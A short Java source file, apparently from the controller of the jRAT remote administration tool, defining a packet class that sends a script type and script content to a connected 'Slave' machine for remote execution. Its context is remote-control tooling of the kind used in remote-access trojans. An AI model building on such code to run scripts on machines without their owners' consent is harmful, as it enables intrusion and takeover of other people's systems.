package jrat.controller.packets.outgoing;

import jrat.common.script.Script;
import jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet35Script extends AbstractOutgoingPacket {

	private Script type;
	private String content;

	public Packet35Script(Script type, String content) {
		this.type = type;
		this.content = content;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(type.getIdentifier());
		slave.writeLine(content);
	}

	@Override
	public short getPacketId() {
		return 35;
	}

}
